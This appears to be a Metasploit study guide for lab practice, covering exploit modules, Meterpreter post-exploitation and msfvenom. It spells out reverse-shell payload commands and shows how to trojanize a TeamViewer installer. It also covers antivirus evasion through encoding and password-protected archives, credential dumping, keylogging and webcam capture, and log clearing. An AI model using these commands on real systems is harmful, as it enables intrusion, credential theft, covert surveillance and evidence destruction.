sudo apt update && sudo apt install metasploit-framework

Why update? New exploits, payloads, and bug fixes are pushed regularly. Running outdated modules can mean missing critical vulnerabilities or getting broken exploits.

First Things After Launching

help        # List all available commands

Module Structure & Types

Every module follows this naming convention:

<type>/<os>/<service>/<name>
# Example:
exploit/windows/smb/ms17_010_psexec
Tag Meaning
Type What the module does (see below)
OS Target operating system (windows, linux, unix, etc.)
Service Vulnerable service or action category
Name Specific action the module performs

Module Types

Type Description Interactable?
exploit Exploits a vulnerability to deliver a payload ✅ Yes
auxiliary Scanning, fuzzing, sniffing, brute-forcing, admin tasks ✅ Yes
post Post-exploitation — credential gathering, pivoting, recon ✅ Yes
payload Code that runs on the target (reverse shell, bind shell, Meterpreter) Used with exploits
encoder Modifies payloads for compatibility / AV evasion Used with payloads
nop No-Operation sled — maintains consistent payload size Used in exploits
evasion Generates evasion-focused payloads and techniques Specialized

Note: use <number> only works with exploit, auxiliary, and post modules — these are the interactable ones.

Searching for Modules

Basic Search

search <keyword>
# Example:
search eternalromance
search ms17_010

Why search? With 2000+ modules, manually browsing is impractical. Search filters the list fast.

Advanced Search Syntax

search cve:2009 type:exploit
search cve:2009 type:exploit platform:-linux     # Exclude Linux
search type:exploit platform:windows cve:2021 rank:excellent microsoft
search eternalromance type:exploit               # Filter by type

Search keywords you can use:

Keyword Usage
cve: By CVE ID (e.g., cve:2021)
type: exploit, payload, auxiliary, encoder, post, nop, evasion
platform: windows, linux, unix, android, etc.
rank: excellent, great, good, normal, average (or numeric with gte400)
name: Filter by module name
author: Filter by module author
port: Filter by port number
date: Filter by disclosure date

Sorting Results

search cve:2009 -s name          # Sort ascending by name
search type:exploit -s type -r   # Sort descending by type

Using Results

After a search, use the index number instead of the full path:

use 0        # Load first result
use <full/path/to/module>   # Also valid

Module Selection & Configuration Workflow

This is the core loop you'll repeat constantly:

Step 1 — Load the Module

use exploit/windows/smb/ms17_010_psexec
# OR after search:
use 0

Step 2 — Check Module Info

info

Why info? This shows you what the exploit actually does, who wrote it, CVEs it covers, required options, and available targets. Always read this before firing — it tells you if a named pipe is required, what Windows versions are supported, and references to the original vulnerability disclosure.

Output includes:
- Module name, platform, architecture
- Provided by (researchers who found/ported it)
- Available targets (OS versions)
- References (CVE links, advisory URLs, GitHub repos)
- "Also known as" (e.g., EternalBlue, EternalRomance)

Step 3 — View Options

show options

Why? Everything marked Required: yes must be set before you can run the exploit. Missing any required field = exploit fails immediately.

Key common options:

Option Meaning
RHOSTS Target IP(s) — remote hosts
RPORT Target port (usually pre-filled correctly)
LHOST Your attacker machine's IP (for reverse connections)
LPORT Your listening port (default 4444)
PAYLOAD The payload module to use

Step 4 — Set Options

set RHOSTS 10.10.10.40          # Set target IP
set LHOST 10.10.14.15           # Set your IP
set LHOST tun0                  # Can use interface name instead
set RPORT 445                   # Usually pre-set correctly

# Check your own IP from inside msfconsole:
ifconfig

Permanent Global Settings

setg RHOSTS 10.10.10.40

Why setg? If you're hitting the same target across multiple modules, setg saves you from re-typing the IP every time. It persists until you restart msfconsole or override it.

Step 5 — Run

run       # Standard command to launch
exploit   # Alias for run

Targets

Targets define which exact OS version/service pack the exploit is aimed at. Wrong target = crash without compromise.

Viewing Targets

show targets            # Must be inside a loaded exploit module

Example output (IE exploit):

Id  Name
--  ----
0   Automatic
1   IE 7 on Windows XP SP3
2   IE 8 on Windows XP SP3
5   IE 8 on Windows 7
6   IE 9 on Windows 7

Selecting a Target

set target 6            # Pick IE 9 on Windows 7

Why specify a target? "Automatic" lets MSF detect the OS, but if you already know the exact version from your Nmap scan, specifying it makes the exploit more reliable and avoids unnecessary probing noise.

Target Types: Each target differs by return address (e.g., jmp esp, pop/pop/ret), which can change between OS language packs and service packs. Use msfpescan to find valid return addresses if building custom exploits.

Payloads

A payload runs on the target after the exploit delivers it. It's what gives you access.

Payload Types

Type Description Named with
Singles Self-contained, exploit + shellcode all-in-one. Stable, but larger. _ (e.g., shell_bind_tcp)
Stagers Small, establishes the connection, then pulls down the Stage First part before /
Stages Downloaded by the Stager. Full-featured (Meterpreter, VNC, shell) After the /

Reading payload names:

windows/shell_bind_tcp         → Single payload (no stage)
windows/shell/bind_tcp         → Stager (bind_tcp) + Stage (shell)
windows/x64/meterpreter/reverse_tcp  → Staged Meterpreter

Stage0 — The Initial Connection

The first code sent exploits the vulnerability and creates a reverse connection back to you (or binds a port on the target). Common:
- reverse_tcp — target calls back to you on a TCP port
- reverse_https — target calls back over HTTPS (harder to detect)
- bind_tcp — you connect to a port opened on the target

Why reverse connections? Outbound traffic from target to attacker is less likely to be blocked than inbound. Most firewalls allow outbound.

Meterpreter Payload

Meterpreter is Metasploit's flagship payload. It uses DLL injection to:
- Run entirely in memory — no files on disk
- Leave no forensic traces
- Establish an AES-encrypted channel back to you
- Be extensible — load plugins dynamically at runtime

Capabilities include: keystroke logging, screenshot capture, hash dumping, webcam access, process migration, privilege escalation, pivoting.

Listing Payloads

show payloads                              # List all (500+ options)
grep meterpreter show payloads             # Filter for Meterpreter
grep meterpreter grep reverse_tcp show payloads   # Chain grep filters
grep -c meterpreter show payloads          # Count matching results

Why grep? 500+ payloads is overwhelming. Chain grep commands to narrow down fast. -c gives you a count.

Setting a Payload

set payload windows/x64/meterpreter/reverse_tcp
# OR by index number:
set payload 15

What happens after? New options appear (LHOST, LPORT, EXITFUNC) — these are payload-specific settings you must configure.

Common Windows Payloads

Payload Type
windows/x64/shell_reverse_tcp Basic reverse shell, single
windows/x64/shell/reverse_tcp Basic reverse shell, staged
windows/x64/meterpreter/reverse_tcp Meterpreter staged (most common)
windows/x64/meterpreter_reverse_tcp Meterpreter inline (no stager)
windows/x64/powershell/reverse_tcp PowerShell interactive session
windows/x64/vncinject/reverse_tcp VNC GUI session

Encoders

Encoders transform the payload to:
1. Remove bad characters (e.g., null bytes \x00) that would break the exploit
2. Change architecture compatibility (x86, x64, SPARC, MIPS, PPC)
3. Help with AV evasion (less effective than it used to be)

Shikata Ga Nai (SGN)

The most popular encoder. Polymorphic XOR additive feedback encoder. The name (仕方がない) means "It cannot be helped." Once considered highly effective for AV evasion — now detectable by most modern AV.

Reference: https://hatching.io/blog/metasploit-payloads2/

Viewing Compatible Encoders

show encoders       # Shows only encoders compatible with your selected module + payload

Generating Encoded Payloads with msfvenom

# Single pass encoding
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe \
  -o ./TeamViewerInstall.exe

# Multiple iterations (10x) — harder to detect, still often caught
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 \
  -o /root/Desktop/TeamViewerInstall.exe

Reality check: Even 10 iterations of SGN is detected by most modern AV (51/68 on VirusTotal in the module's example). Encoding alone is not sufficient for modern AV evasion. You need additional techniques (packers, templates, custom code).

Checking Against VirusTotal

msf-virustotal -k <API_key> -f TeamViewerInstall.exe

Requires a free VirusTotal account and API key. Useful for testing detection rates before deploying a payload.

Databases

MSF uses PostgreSQL to track everything during an assessment: hosts, services, credentials, loot, notes, vulnerabilities.

Setup

sudo service postgresql status         # Check if Postgres is running
sudo systemctl start postgresql        # Start it

sudo msfdb init                        # Initialize MSF database
sudo msfdb status                      # Check DB status
sudo msfdb run                         # Launch msfconsole connected to DB

If Already Configured

msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
msf6 > db_status                       # Confirm connection

Database Commands Inside MSFconsole

db_status                  # Check if connected to DB
help database              # Show all DB-related commands
Command What It Does
db_connect <name> Connect to an existing database
db_disconnect Disconnect from current DB
db_import <file> Import scan results (Nmap XML, Nessus, etc.)
db_export -f xml <file> Export current DB workspace to XML
db_nmap <nmap flags> <target> Run Nmap and auto-save results to DB
db_rebuild_cache Rebuild the module cache
hosts List all discovered hosts
services List all discovered services
vulns List all recorded vulnerabilities
creds List all captured credentials
loot List all captured loot (hashes, shadow files, etc.)
notes List all stored notes
workspace Switch/manage workspaces

Workspaces

Think of these like project folders — one per engagement or target network.

workspace                    # List all, asterisk = current
workspace -a Target_1        # Create and switch to Target_1
workspace Target_1           # Switch to existing workspace
workspace -d Target_1        # Delete a workspace
workspace -D                 # Delete ALL workspaces
workspace -r OldName NewName # Rename workspace
workspace -v                 # Verbose listing

Why workspaces? Keeps scan results, hosts, and loot from different engagements from mixing together.

Importing Nmap Scans

# From a saved XML:
db_import Target.xml

# Directly run Nmap from MSF and auto-save:
db_nmap -sV -sS 10.10.10.8
db_nmap -sV -p- -T5 -A 10.10.10.15

Why XML format? db_import supports XML natively and can parse Nmap, Nessus, and Nexpose output. After importing, hosts and services are instantly available.

After Import — Check Results

hosts          # Shows discovered hosts with OS info
services       # Shows open ports and services per host

Exporting for Backup

db_export -f xml backup.xml
db_export -f pwdump hashes.txt    # Export credentials in pwdump format

Hosts & Services Commands

hosts -h                    # Full help
hosts -R                    # Set RHOSTS from all discovered hosts
hosts -u                    # Show only hosts that are up
services -p 445             # Filter services by port
services -s smb             # Filter by service name
services -R                 # Set RHOSTS from services results

Credentials Management

creds                       # List all captured credentials
creds 1.2.3.4/24           # Credentials for hosts in this range
creds -p 22-25,445         # Filter by port
creds -t NTLM              # Filter by type (NTLM, password, hash)
creds -s smb               # Filter by service name

# Add credentials manually:
creds add user:admin password:Password123 realm:workgroup
creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A

# Delete credentials:
creds -d -s smb            # Delete all SMB creds

Loot

loot -h
loot -t hash               # Search for hash loot

What is "loot"? Files pulled from compromised hosts — passwd files, shadow files, SAM database dumps, config files with credentials.

Plugins

Plugins bring third-party tools directly into msfconsole, making their results part of your MSF database automatically.

Default Plugin Location

/usr/share/metasploit-framework/plugins/

Loading a Plugin

load openvas

After loading, the plugin's commands are added to your help menu. Each plugin has its own sub-commands.

Popular Plugins

Plugin Purpose

Sessions & Jobs

Sessions

A session is an active connection channel between you and a compromised host (Meterpreter shell, command shell, etc.).

sessions                    # List all active sessions
sessions -i 1               # Interact with session 1
sessions -l                 # Same as sessions (list)
sessions -l -v              # Verbose — shows what exploit created each session
sessions -K                 # Kill ALL sessions
sessions -s <script>        # Run a Meterpreter script across all sessions
sessions -c <cmd>           # Run a command on all live sessions
sessions -u <id>            # Upgrade a basic shell to Meterpreter

Backgrounding a session:
- Press Ctrl + Z inside a Meterpreter session, OR
- Type background in the Meterpreter prompt

Why background? So you can run additional modules against the same target without losing your shell. You go back to msf6 > and can launch post-exploitation modules targeting SESSION 1.

Interacting Pattern

1. Exploit → Meterpreter session opens
2. background → Return to msf6 > prompt
3. search local_exploit_suggester
4. use post/multi/recon/local_exploit_suggester
5. set SESSION 1
6. run
7. See results, pick a privesc
8. Use privesc module with SESSION 1
9. New elevated Meterpreter session opens

Jobs

Jobs let you run exploits and listeners in the background without blocking your console.

jobs -l                     # List all running jobs
jobs -i <id>                # Detailed info about a job
jobs -K                     # Kill ALL jobs
jobs -k <id>                # Kill a specific job

# Run an exploit as a background job:
exploit -j                  # Adds -j to run in background

Why jobs? If a listener (e.g., multi/handler) is running on port 4444 and you need that port for something else, you can't just Ctrl+C (the port stays open). Use jobs to properly kill it.

Meterpreter — Deep Dive

Meterpreter is the most capable post-exploitation payload in MSF. Key design goals:

  • Stealthy — Lives entirely in memory, no disk writes, no new processes
  • Powerful — Channelized comms, process migration, AES encryption
  • Extensible — Load extensions at runtime over the network

How Meterpreter Starts

  1. Exploit delivers initial stager
  2. Stager loads Reflective DLL (via DLL injection)
  3. Meterpreter core initializes AES-encrypted link
  4. Sends GET to your machine — Metasploit configures the client
  5. Always loads stdapi extension; loads priv if running as admin

Core Meterpreter Commands

help              # List all Meterpreter commands
background / bg   # Background current session
sessions          # Switch to another session
exit / quit       # Terminate Meterpreter session

System Information

sysinfo           # OS, hostname, architecture
getuid            # Who are we running as?
getpid            # Our current process ID
getprivs          # List all available privileges
getsid            # Get current user's SID

Why sysinfo? After landing a shell, you need to know the architecture (x86 vs x64) and OS version to select the right local privilege escalation exploit. getuid tells you if you're SYSTEM already or need to escalate.

Filesystem Navigation

ls / dir          # List files in current directory
cd <path>         # Change directory
pwd / getwd       # Print current directory
cat <file>        # Read a file
download <file>   # Download file from target to your machine
upload <file>     # Upload file from your machine to target
search -f *.txt   # Search for files by pattern
mkdir <dir>       # Create directory
rm <file>         # Delete file

After getting shell: First ls the common directories — C:\Users, C:\Inetpub, C:\Windows\System32 — looking for interesting files, configs, or credentials.

Process Management

ps                          # List all running processes (shows PID, user, path)
pgrep <name>                # Search processes by name
kill <PID>                  # Terminate a process

Why ps? You need it before migrating processes. Look for stable, long-running processes owned by SYSTEM or a privileged user. Also helps find AV processes to be aware of.

Process Migration

migrate <PID>               # Migrate Meterpreter into another process

Why migrate? Your initial shell might be in an unstable process (like a web server worker). Migrating into explorer.exe or svchost.exe gives you a more stable, persistent session. Also used when getuid fails with "Access is denied" — steal a token first, then migrate.

Privilege Escalation

getsystem                   # Attempt to escalate to SYSTEM via multiple vectors
use priv                    # Load privilege extension (extended Meterpreter libraries)

If getsystem fails: Background the session, run post/multi/recon/local_exploit_suggester, and try the suggested exploits one by one.

Token Manipulation (Incognito)

Used for token stealing and impersonation — to run as a different user without knowing their password.

use incognito               # Load incognito module
list_tokens -u              # List available tokens by user
list_tokens -g              # List available tokens by group
impersonate_token "DOMAIN\\Username"   # Impersonate a user's token
steal_token <PID>           # Steal token from a specific process
drop_token                  # Stop impersonating, revert
rev2self                    # Revert to original user
⚡ When to use After getting SYSTEM or seeing admin tokens via list_tokens, you can impersonate a Domain Admin token without ever knowing their password. This is classic lateral movement.

Credential Dumping

hashdump                    # Dump all local SAM hashes (requires SYSTEM)
lsa_dump_sam                # SAM dump with user RIDs and full LM/NTLM hashes
lsa_dump_secrets            # Dump LSA secrets (service account passwords, cached creds)

Why hashdump? Gets you NTLM hashes of all local accounts. These can be cracked offline (Hashcat, John) or used directly in Pass-the-Hash attacks. lsa_dump_secrets often reveals service account plaintext passwords.

Next steps with hashes: Crack them with Hashcat/John, or use them for Pass-the-Hash / Pass-the-Ticket attacks to move laterally across the network.

Shell Access

shell                       # Drop into a standard Windows CMD shell
execute -f cmd.exe -i       # Execute cmd.exe interactively
execute -f cmd.exe -i -t    # Execute with all available tokens
execute -f cmd.exe -i -H -t # Execute hidden with all tokens

When to use shell vs Meterpreter? Shell gives you a raw CLI. Meterpreter commands are more stealthy and have more features. Some post-exploitation tasks (like running specific tools you upload) require a real shell.

Networking

ifconfig / ipconfig         # List network interfaces
arp                         # ARP cache (shows other hosts on the network)
netstat                     # Active connections
route                       # View/modify routing table
portfwd add -l 8080 -p 80 -r 10.10.10.1   # Port forward
resolve <hostname>          # Resolve hostname via target's DNS

Why arp and ifconfig? Pivoting — you may discover internal networks not visible from your attack host. The target's ARP cache reveals other live hosts you can now reach through your session.

User Interface / Surveillance

screenshot                  # Take screenshot of target's desktop
screenshare                 # Live view of desktop
keyscan_start               # Start capturing keystrokes
keyscan_dump                # Dump captured keystrokes so far
keyscan_stop                # Stop keylogger
webcam_list                 # List webcams
webcam_snap                 # Take webcam photo
record_mic                  # Record from microphone
uictl enable keyboard       # Take control of keyboard
uictl enable mouse          # Take control of mouse
setdesktop <number>         # Switch to a different logged-in desktop

Windows Registry

reg <command>               # Interact with target registry (create, delete, query, set)

Anti-Forensics / Cleanup

clearev                     # Clear Windows event logs (Security, System, Application)
timestomp <file>            # Modify file timestamps (creation, modified, accessed)

When to use clearev: If you need to reduce forensic evidence before leaving. Be aware — clearing logs itself generates an event in some SIEM configurations.

Networking / Sniffer

use sniffer                 # Load sniffer module (from Meterpreter prompt using `load`)
sniffer_interfaces          # List available network interfaces
sniffer_dump <interfaceID> capture.pcap   # Start capturing traffic
sniffer_start <interfaceID> 100           # Start sniffing with packet buffer
sniffer_stats <interfaceID>              # Stats on current capture
sniffer_stop <interfaceID>              # Stop sniffing

Remote User Management

add_user username password -h <IP>                    # Add user on remote target
add_group_user "Domain Admins" username -h <IP>        # Add user to Domain Admins
reboot                                                 # Reboot target machine

Writing & Importing Modules

Updating MSF for New Modules

sudo apt update && sudo apt install metasploit-framework

Finding Custom Exploits

ExploitDB (https://www.exploit-db.com) — search with the Metasploit Framework (MSF) tag to find modules you can directly import.

searchsploit — CLI tool for ExploitDB:

searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"   # Exclude Python scripts, show only Ruby

.rb files are Ruby scripts — many are MSF-compatible. Not all .rb files are MSF modules though.

Installing a Custom Module

# Copy to the appropriate modules directory:
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb

# Load it at runtime:
msfconsole -m /usr/share/metasploit-framework/modules/

# OR from inside msfconsole:
loadpath /usr/share/metasploit-framework/modules/
reload_all

Naming convention: Use snake_case with alphanumeric characters and underscores only. No dashes. Example: nagios3_command_injection.rb

Module Directory Structure

ls /usr/share/metasploit-framework/modules/
# auxiliary  encoders  evasion  exploits  nops  payloads  post

Your ~/.msf4/modules/ directory works the same way for personal modules.

MSFVenom

MSFVenom replaced the old msfpayload + msfencode combination into a single unified tool. Use it to:
- Generate standalone payloads in dozens of formats
- Embed payloads into existing executables
- Encode payloads (multiple iterations)

Basic Syntax

msfvenom -p <payload> [options] -f <format> -o <output_file>

Common Flags

Flag Meaning
-p <payload> Payload to use
-a <arch> Architecture (x86, x64)
--platform <OS> Target platform (windows, linux, php, etc.)
LHOST=<IP> Attacker IP (for reverse payloads)
LPORT=<port> Attacker port
-f <format> Output format (exe, elf, php, aspx, raw, perl, c, etc.)
-e <encoder> Encoder to use
-i <count> Number of encoding iterations
-b "<badchars>" Bad characters to avoid (e.g., "\x00")
-o <file> Output file
-x <template> Inject into an existing executable template
-k Keep original template running alongside payload

Generating Payloads — Examples

# Windows x64 Meterpreter reverse TCP (most common)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# ASPX shell for IIS web servers
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

# PHP shell for web servers
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php

# Linux ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Encoded Windows payload (SGN, 10 iterations)
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 \
  -o TeamViewerInstall.exe

Injecting into a Legitimate Executable (Trojan)

msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -x ~/Downloads/TeamViewer_Setup.exe \
  -e x86/shikata_ga_nai -a x86 --platform windows \
  -o ~/Desktop/TeamViewer_Setup.exe -i 5

-k flag: Keeps the original application running normally when executed, so the victim doesn't see any obvious change in behavior. Without -k, the original program won't run, which is suspicious.

Setting Up the Listener (multi/handler)

After generating a payload, always set up a listener to catch the reverse connection:

msfconsole -q
msf6 > use multi/handler
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 1337
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
# OR run as background job:
msf6 exploit(multi/handler) > exploit -j

multi/handler is the generic catch-all listener. Always match the PAYLOAD, LHOST, and LPORT to what you used in msfvenom.

Archiving to Bypass AV

Double-archiving with passwords can reduce AV detection to 0/49:

# Generate payload
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

# Archive 1 with password
rar a ~/test.rar -p ~/test.js
mv test.rar test           # Remove extension

# Archive 2 with password  
rar a test2.rar -p test
mv test2.rar test2         # Remove extension — this is your delivery file

Why this works: AV can't scan inside password-protected archives. However, it will flag them as "unable to scan" in admin dashboards — a human can still manually inspect them.

Packers (AV Evasion)

Packers compress + encrypt the payload into a single file with a decompression stub. When executed, the payload is decompressed and run.

Popular packers:
- UPX — most common, widely known
- The Enigma Protector
- MPRESS
- Themida

Reference: PolyPack Project

Firewall & IDS/IPS Evasion

Protection Types

Endpoint Protection — software on individual hosts (AV, anti-malware, firewall). Examples: Avast, Nod32, Malwarebytes, BitDefender.

Perimeter Protection — physical/virtual devices at network edges (firewalls, IDS/IPS).

DMZ — De-Militarized Zone — lower trust than internal, higher trust than internet. Public-facing servers live here.

Detection Methods

Method How It Works
Signature-based Compares traffic/files against known attack patterns. 100% match = alarm. Most AV uses this.
Heuristic/Behavioral Compares against baselines for known APTs. Deviations trigger alarms.
Stateful Protocol Analysis Detects protocol divergence from accepted "normal" definitions.
SOC Live Monitoring Human analysts reviewing real-time alerts.

MSF6 AV Evasion Capabilities

  • All Meterpreter traffic is AES-encrypted end-to-end (Windows, Python, Java, Mettle, PHP)
  • SMBv3 client support for modern exploitation
  • Polymorphic payload generation — shuffles instructions each time, breaking signature databases
  • Meterpreter DLLs resolve functions by ordinal instead of name — harder to fingerprint
  • ReflectiveLoader export is no longer present as plain text in payload binaries

Evasion Techniques Summary

  1. Multiple encoding iterations — helps some, but not against modern AV
  2. Executable templates (-x in msfvenom) — embed payload in legitimate software
  3. Password-protected archives — bypasses signature scanning entirely
  4. Packers — compress + encrypt the payload
  5. AES-encrypted communication (MSF6 default) — bypasses network IDS/IPS
  6. DNS exfiltration — for data exfiltration when all other channels are monitored
  7. Recompile Meterpreter from source — removes known signatures entirely

Exploit Code Randomization

When writing custom modules, add randomization to avoid signature-matching of buffer patterns:

'Targets' =>
[
  [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],

Avoid obvious NOP sleds. IDS/IPS regularly look for both overflow code and NOP-filled memory regions.

References on Evasion

  • US Government Post-Mortem on Equifax Hack — DNS exfiltration used to bypass monitoring
  • Protecting from DNS Exfiltration

Tools Referenced in This Module

Nmap

Network scanner for enumeration. Used to discover open ports, services, and OS versions before selecting exploits.
- Reference: https://nmap.org
- Inside MSF: db_nmap -sV -sS <target>

Meterpreter

Advanced post-exploitation payload built into Metasploit. DLL-injection based, in-memory, AES-encrypted.

MSFVenom

Payload generator and encoder. Successor to msfpayload + msfencode.

Searchsploit

CLI tool for searching ExploitDB offline. Useful when MSF doesn't have the module you need.

searchsploit <keyword>
searchsploit -t <term> --exclude=".py"

msfpescan

Tool for finding return addresses in PE binaries — used for custom exploit development.
